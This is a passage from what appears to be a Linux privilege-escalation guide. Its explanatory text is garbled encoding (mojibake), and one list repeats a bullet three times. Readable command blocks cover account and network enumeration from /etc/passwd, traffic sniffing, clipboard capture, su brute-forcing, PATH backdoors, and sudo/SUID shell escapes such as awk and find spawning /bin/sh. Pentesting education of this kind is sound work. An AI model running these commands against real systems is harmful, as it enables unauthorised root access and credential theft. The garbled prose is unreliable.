рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк **`docker` рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ**, рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ [**рдЕрдзрд┐рдХ рддрд░реАрдХреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**](interesting-groups-linux-pe/#docker-group)ред рдпрджрд┐ [**рдбреЙрдХрд░ API рдХрд┐рд╕реА рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрди рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдЗрд╕реЗ рднреА рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](../../network-services-pentesting/2375-pentesting-docker.md#compromising)ред

рдбреЙрдХрд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдпрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ **рдЕрдзрд┐рдХ рддрд░реАрдХреЗ** рджреЗрдЦреЗрдВ:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдирд╛

рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЖрдк **`ctr`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдирд╛

рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЖрдк **`runc`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS рдПрдХ **рдЗрдВрдЯрд░-рдкреНрд░реЛрд╕реЗрд╕ рд╕рдВрдЪрд╛рд░ (IPC) рд╕рд┐рд╕реНрдЯрдо** рд╣реИ, рдЬреЛ рдПрдХ рд╕рд░рд▓ рдФрд░ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рддрдВрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ **рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдПрдХреНрд╕реЗрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдПрдХ рджреВрд╕рд░реЗ рд╕реЗ рдмрд╛рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЪрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕реЗрд╡рд╛рдПрдВ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред D-BUS рдХреЛ рдПрдХ рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рд╡рд╛рд▓рд╛ IPC рдФрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдкрд╣рд▓реЗ, D-BUS рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХреНрд╕реЗрдкреНрд▓рд┐рдХреЗрд╢рди IPC рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреВрд╕рд░реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбреЗрдЯрд╛ рднреЗрдЬ рд╕рдХрддреА рд╣реИ - рдпрд╣ UNIX рдбреЛрдореЗрди рд╕реЙрдХреЗрдЯреНрд╕ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рд╣реИред рджреВрд╕рд░рд╛, D-BUS рдкреНрд░рдгрд╛рд▓реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╡реЗрдВрдЯреНрд╕, рдпрд╛ рд╕рд┐рдЧреНрдирд▓реНрд╕, рднреЗрдЬрдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рдгрд╛рд▓реА рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдШрдЯрдХ рд╕рдВрдЪрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдВрддрддрдГ рдмреЗрд╣рддрд░ рдПрдХреАрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдмреНрд▓реВрдЯреВрде рдбреАрдореЙрди рдЖрдкрдХреЗ рдореНрдпреВрдЬрд╝рд┐рдХ рдкреНрд▓реЗрдпрд░ рдХреЛ рдЗрдирдХрдорд┐рдВрдЧ рдХреЙрд▓ рд╕рд┐рдЧреНрдирд▓ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдкрдХрд╛ рдореНрдпреВрдЬрд╝рд┐рдХ рдкреНрд▓реЗрдпрд░ рд░реЛрдХрдХрд░ рд╡реЙрд▓реНрдпреВрдо рдХреЛ рдХрдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рддрдХ рдХреЙрд▓ рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рдЕрдВрдд рдореЗрдВ, D-BUS рдПрдХ рд░рд┐рдореЛрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ рдЕрд▓рдЧ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рд╕реЗрд╡рд╛рдПрдВ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рд╕реЗ рд╡рд┐рдзрд┐ рдХреЛ рдЖрд╣реНрд╡рд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ - рдЗрд╕реЗ рдЬрдЯрд┐рд▓рддрд╛рдУрдВ рдХреЗ рдмрд┐рдирд╛ CORBA рдХреА рддрд░рд╣ рд╕реЛрдЪреЗрдВред (рдпрд╣рд╛рдВ рд╕реЗ [рдпрд╣рд╛рдВ](https://www.linuxjournal.com/article/7744)ред)

D-Bus рдПрдХ **рдЕрдиреБрдорддрд┐/рдЕрд╕реНрд╡реАрдХреГрддрд┐ рдореЙрдбрд▓** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрджреЗрд╢ (рдореЗрдердб рдХреЙрд▓, рд╕рд┐рдЧреНрдирд▓ рдЙрддреНрдкрд╛рджрди, рдЖрджрд┐) рдХреЛ рдЙрд╕рд╕реЗ рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдиреАрддрд┐ рдирд┐рдпрдореЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ **рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдпрд╛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ**ред рдиреАрддрд┐ рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдирд┐рдпрдо рдореЗрдВ `own`, `send_destination` рдпрд╛ `receive_sender` рд╡рд┐рд╢реЗрд╖рддрд╛ рд╕реЗрдЯ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред

`/etc/dbus-1/system.d/wpa_supplicant.conf` рдХреА рдиреАрддрд┐ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛:
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХреЛрдИ рдиреАрддрд┐ рдЖрдкрдХреЛ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ **рдмрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣реА рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕реЗ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╢рд╛рдпрдж рдХреБрдЫ рдкрд╛рд╕рд╡рд░реНрдбреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП?).

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ **рдиреАрддрд┐** рдЬреЛ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╕рдореВрд╣ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд░рддреА рд╣реИ, рд╕рднреА рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ (`<рдиреАрддрд┐>`).\
"рдбрд┐рдлрд╝реЙрд▓реНрдЯ" рд╕рдВрджрд░реНрдн рдХреЗ рд▓рд┐рдП рдиреАрддрд┐рдпрд╛рдВ рдЙрди рд╕рднреА рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЕрдиреНрдп рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ (`<рдиреАрддрд┐ рд╕рдВрджрд░реНрдн="рдбрд┐рдлрд╝реЙрд▓реНрдЯ"`).

**рдпрд╣рд╛рдВ рдЬрд╛рдиреЗрдВ рдХрд┐ D-Bus рд╕рдВрдЪрд╛рд░ рдХреЛ рдЬрд╛рдВрдЪрдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдХреНрдпрд╛ рд╣реИ:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **рдиреЗрдЯрд╡рд░реНрдХ**

рдорд╢реАрди рдХреА рд╕реНрдерд┐рддрд┐ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдЕрдиреБрдорд╛рдирд┐рдд рдХрд░рдирд╛ рд╣рдореЗрд╢рд╛ рд░реЛрдЪрдХ рд╣реЛрддрд╛ рд╣реИ.

### рд╕рд╛рдорд╛рдиреНрдп рдЬрд╛рдВрдЪ
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### рдЦреБрд▓реЗ рдкреЛрд░реНрдЯреНрд╕

рд╣рдореЗрд╢рд╛ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдЙрд╕ рдорд╢реАрди рдкрд░ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЬрд┐рди рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рдереЗ, рд╡реЗ рдХреМрди рд╕реА рд╣реИрдВ:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### рд╕реНрдирд┐рдлрд┐рдВрдЧ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЯреНрд░реИрдлрд┐рдХ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХреБрдЫ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
timeout 1 tcpdump
```
## рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

### рд╕рд╛рдорд╛рдиреНрдп рдЬрд╛рдВрдЪ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдЖрдк рдХреМрди рд╣реИрдВ, рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреМрди рд╕реЗ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реИрдВ, рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХреМрди рд╕реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реИрдВ, рдХреМрди рд╕реЗ **рд▓реЙрдЧрд┐рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреМрди рд╕реЗ **рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реИрдВ:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### рдмрдбрд╝рд╛ рдпреВрдЖрдИрдбреА

рдХреБрдЫ рд▓рд┐рдирдХреНрд╕ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░ рдПрдХ рдмрдЧ рдХреЗ рдХрд╛рд░рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **UID > INT\_MAX** рдХреЗ рд╕рд╛рде рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА: [рдпрд╣рд╛рдВ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [рдпрд╣рд╛рдВ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) рдФрд░ [рдпрд╣рд╛рдВ](https://twitter.com/paragonsec/status/1071152249529884674)ред\
**рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░реЗрдВ** рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ: **`systemd-run -t /bin/bash`**

### рд╕рдореВрд╣

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп** рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб рдореЗрдВ рдХреЛрдИ рд░реБрдЪрд┐рдХрд░ рд╡рд╕реНрддреБ рд╕реНрдерд┐рдд рд╣реИ (рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐

рдПрдХ рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐ рдЕрдкрдирд╛рдирд╛ рдЖрдкрдХреЗ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдиреАрддрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб рдЪреБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрддреНрд╕рд╛рд╣рд┐рдд рдХрд░рддреА рд╣реИ рдФрд░ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕реЗ рдмрдЪрд╛рддреА рд╣реИред рдпрд╣рд╛рдВ рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐ рд╕реБрдЭрд╛рд╡ рд╣реИрдВ:

- рдкрд╛рд╕рд╡рд░реНрдб рдХреА рд▓рдВрдмрд╛рдИ рдХрдо рд╕реЗ рдХрдо 8 рд╡рд░реНрдг рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
- рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдХрдо рд╕реЗ рдХрдо рдПрдХ рдЕрдкрд░рдХреЗрд╕ рдЕрдХреНрд╖рд░, рдПрдХ рд▓реЛрдЕрд░рдХреЗрд╕ рдЕрдХреНрд╖рд░, рдПрдХ рд╕рдВрдЦреНрдпрд╛ рдФрд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг (рдЬреИрд╕реЗ !, @, #, $) рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
- рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдирдпрд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреБрд░рд╛рдиреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдмрдирд╛рддреЗ рд╕рдордп рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред
- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдмрдирд╛рддреЗ рд╕рдордп рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред
- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдмрдирд╛рддреЗ рд╕рдордп рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

рдЖрдк рдЗрди рд╕реБрдЭрд╛рд╡реЛрдВ рдХреЛ рдЕрдкрдиреЗ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд▓рд╛рдЧреВ рдХрд░рдХреЗ рдЕрдкрдиреЗ рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐ рдХреЛ рдордЬрдмреВрдд рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### рдЬреНрдЮрд╛рдд рдкрд╛рд╕рд╡рд░реНрдб

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрдВ, рддреЛ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

### Su Brute

рдпрджрд┐ рдЖрдкрдХреЛ рд╢реЛрд░ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреЛрдИ рдЪрд┐рдВрддрд╛ рдирд╣реАрдВ рд╣реИ рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ `su` рдФрд░ `timeout` рдмрд╛рдЗрдирд░реА рдореМрдЬреВрдж рд╣реИрдВ, рддреЛ рдЖрдк [su-bruteforce](https://github.com/carlospolop/su-bruteforce) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) рдХреЛ `-a` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред

## рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдкрд╛рде рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

### $PATH

рдпрджрд┐ рдЖрдкрдХреЛ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдЖрдк **$PATH рдХреЗ рдХреБрдЫ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдмреИрдХрдбреЛрд░ рдмрдирд╛рдХрд░ рд╡рд░реНрдЪрд╕реНрд╡ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ рд░реВрдЯ) рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрдорд╛рдВрдб рдХрд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЬреЛ рдЖрдкрдХреЗ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рдкрд╣рд▓реЗ рд╕реНрдерд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред

### SUDO рдФрд░ SUID

рдЖрдкрдХреЛ рд╕реБрджреЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ рдпрд╛ рдЙрдирдХреЗ рдкрд╛рд╕ рд╕реБрдЗрдб рдмрд┐рдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
рдХреБрдЫ **рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдХрдорд╛рдВрдб рдЖрдкрдХреЛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░/рдпрд╛ рд▓рд┐рдЦрдиреЗ рдпрд╛ рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред** рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

